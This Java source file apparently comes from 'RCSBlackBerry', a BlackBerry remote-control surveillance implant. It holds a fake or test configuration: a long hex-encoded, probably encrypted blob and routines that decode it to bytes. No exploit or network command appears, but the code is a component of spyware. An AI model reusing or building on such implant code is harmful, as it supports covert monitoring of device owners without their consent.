//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    // 3012
    static String configString = "41e1cb81b8414151e64ed5398c5da5d13798dd88d98e7bb9edb0062444265d42f4d436248f0352051a028010e0995b1c3187a4c31bed7943915d9eec41ddfc620ba76ae078abccf7bb85e420599cc9b148eca7b2875b93df1d2a14a218faf70c209001eab2727ba7f31acb7ec10d1e5ad96ffe4709316453e8d8740f92635faac8701261c3e69060852d64c66db335675296f94f9ec2c9c260e06f773d2dc0a0fe3bb0e9b962d84525287de2d356434a486668f56a647220456ac1e29c0b11890abec660e88a349ce5304e9d3bda4f11cdde3fcce12a3b50426235d97e4614088cb79ff660e5a23677e3358a0f977c83e66e0a1bbcf5b3e5e9ed14af3f8efa5224637fba34a30a88338de16915f9de59e1ef2f8357a7fc9700576f9e2de2996d8856437adc093392605ff8432997bfcf38d7da34dc3a2f00a9619f1aff12d8c274849161681ccd77dba8074b9a96be5d5760b6cc236bc7b85073f0fa01f3f349567d5d7acb536f3cc027a6f089d07a68f2537699868fbe8ed9168de5850f6a899335bcb858041a7fbe600aba388cdaa33d55445e0778d82e8a34d8c364ad16d711c7f5dda2154693e292b9e2876e7ad20f62eb4a2bfa2275f27f9a622e70f6ca5bb3e9d2f1423896b1448bc497ea0e1e5ece8d2dd3e2931255e70f1e7f25c2ddc332a188c9ea311f85ac8f378252ca47178e817470f5a86bf45f63c8058728b01d7e15ec14033a91610ccaea608a204abaa038770759224e98e9769ede15dc22183eca15ce7e414b494e768522b683f11f0fc708eaf3b6584fc3667ee9250c17127893a38b27d46afcff3230c6a91358b691b99f879e5114d42a01d5773222a13a9ffa1a6154e6e0a44bb64f7523634ee8e1ec7e803c4afa2f9e9e3d639d7fe3fc77d64ea43fdec608da94ffb4aeb79a24642992e36149e8b9ff705f0d55b41b65260a6b7b7d5e375122e7898686c0e5bf7ab9d39801a4ea90fb4b522117b74b426cbd06d3b2345cfbd90d1fb1aca84fbf762d2972e3ea77d6dd55a9c1043999021b1279ef99a3ab68c10c45168d46bc7050cf2c14fe6f157483fd1f07ac7aa1d08475f1d251887fea9683cb35e6514c0f795a0ef126ff687f45532b6f41cbe387e2e8829e331c11f4c74aa8ee60991ef6c9388e8157c9f680b5591e26a8b020075412591af81829ceb54be21c4fad7a858a8d3c6baad28b2792b845544649a37bb825e8cc6c51bf5229d8ccdc266e0814666b304d530c290522d208fc226003f2650d9da1a89c97418b47758a6a4a9ea3727f0101275b5206cb1d1a263bc2d1b05ef7422e2a8abab0ba12da8a26c592ff7fab82e03b4f20278999e1a93f48afc5ba2001dde2ce1fb7137b90a35905a767c86a2cd36fc3071056baa690d493bf55e95840f2f697f2d06e9a4f066f6232de3678ffac7d7f50e93d6a0e3db208006e43a7cd49407a40bb5a05cc6707dacc0616a0e01f2984ef16ff605be1a7a2dbda785f7ff865ad016dc739b7c0cba7ec9f96758fd97988fc53c97b39ee5d45f954083d89aec10bfbd1c506fd95ec1cf88620ded73a37ae6db3cd3ebc878f2d91b7275fedab340404f66a89b1e9972f9e297cde12403d7818a255f4064bd39e3dafe3d54209949984b9abf287dbcd7faf70e4f2292e8ec7378ac275aef6d941042a48c6f6b49e09dedfa850d969a3a8643c69456a249e076ce1c4df045766b9ef602ff633520996ecf9d14058c5d8f46f4072ac6d21778a1a61f2f99f6aa33a856ea61985c37841b63fdb9c60d63b82069322292c7aade5a0babbb94c7d51a40d2e5c7b6e723d2882454751011bdb0a951ee2c35e9a96f8c144e2aae4572feb7e11b7f386c28f5c66169565b978aa638cb8a722bcaa2f47c6cb9c3343731afdb61416e08b20d81857302a5fc4c63286b87a7e307820fdf35f8ba0e3d5a7f99f8254357265cc76ba918e0e1c4e799c4121cf60bd8e86b6976394a42f658ac3775e9ce91da7f53ff464138125265319e6989780ab6618577c56d5c37044140bdef6c261cc1bf796c7f8623461db6882871546f883af074cf9b4f0f7eb9c5250ea7a4b8a5643a3f3381db981225fcc72bbaa170fbde16684c10fac5b095c1d8b86cab2b40720bbaf861af592730cebca7073d7c914ac46925345a052e606aac34dcb3c05c4bd0bd869661c447acd1c0018da6b95d3a41f83d7b12de5b61eb4365b15a1ab9245696faede2ef9bbde14a9f2923e9eaa6e6b5424c43223c3f44d975aea3edabd0cb43127c10fdc3210f4c64a73fcda7ecf8730c64a9480fc5c7f0b5f634183dc985d19c1fde543fdfc55aeb7551191e71b04a956d478bd6f1dcfc0173502de84c91266a4c6a3fc83157934366b371fa84ac3021d97733bd3b4ff7f0b4a20508548454365784b97f4df88d81e0d87b03f355dd9d8a1ca74876ee615779408571ef0de8a57db4350c79643383a15f712359ccbd65ccce9b94ea2e537a04be782fb78d7992929699db2e8b403353d32d99297716e05afe863d2ff8cba4bddc3c67a61fee58f34350ea53d2cde3578d815a418070851a6e1bb742ef765e5d10b25521cffad5d499d26f10f47ba80d29021984408bb1fd9b59001d8340c74777b00e770a32aae38e6fe392c950f88098b6405bc604e4b772bbb4f46525f18a9269806490fcaba3f1ba4284e404dec642562778b469308be323ecd64323534581f0776bb504d6334e7e214317e1b248f67a482979d138d4b242717bc5899a902d94d83ac92c805df2d0c81b6e107a8720872ecdb6d79ba3642a69f00b75d66c0fb39717c070f2405d48e02d6162ebacccb14fba89c95c0edd40be281a008e9246828cdafbbc23bd1837591a7ec36d6c041de541c18603e33d91032365ae03ef2c1302a185af99918791295da50489e24850bd45e69a60eb203a0deb3878b9b8364da1b158be9635e2ab6dbd29acfc6c48c80a857a6750c461df987005281e67e8b535a828784ff6e6968089bd1b2938e4a5c6b08a04492b5642baa32f6e3620c8cc41c9130de7bb664c8a43c6bb6632c3c721b09b31a1fc62eb92da01a31c539cdb7c1b6d5d2a95e0e75a329230e48727b24c62f36bc35605065980a00db0a4e6d38606ae6d4cc857c6837ef970e896bf8f1f921e777602cbea55bbde25af99a9e39972d437cd1414e2d42d436162a65708a95e28a57e1e7d64f440183ae1f7f70020c81e475cc7e2492aabb6e836a0f8d255e18af19f744fa0813b8805862279fc1c04749b989ab07ad2dc254c59a7c29750f1fe27b9d64ed1a156501b3fc3952b0f9a0efdd1898d7c403ccd0977aa0117849399fc0ee7c6be540060b54b2241a180c5ba043eead427cef2763b15a7695c66e1a2204d0e30b555f980ed08ca9c2499cc70c3a2ce5d5ccd1033e7c800e05d31fd874bd53b1aa5375feab72bbad4ddb5df4a21df693cdfdf639bc039f67174e9dac309f3db0773df672a1c0eeefcaa47d8dd6eb06204bd18b913e3411b8b7f10221dee7be5d92ea9239889b543418ca7e9a12c3141f9a9dfb47a6f078eb3d718e1b30662ef6e3e3d5a75732190307027b64a793bc6c73ac17cedcd6f09155e9b30b545d8900cf3df72f6b6aa73b";
    
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArrayWithLen(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArrayWithLen(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    public static byte[] hexStringToByteArray(final String config) {
        int len = config.length() / 2;
        final byte[] ret = new byte[ len ];

        for (int i = 0; i < ret.length; i++) {
            final char first = config.charAt((i ) * 2);
            final char second = config.charAt((i ) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif

    public static String getJson() {        
        return null;
    }
}

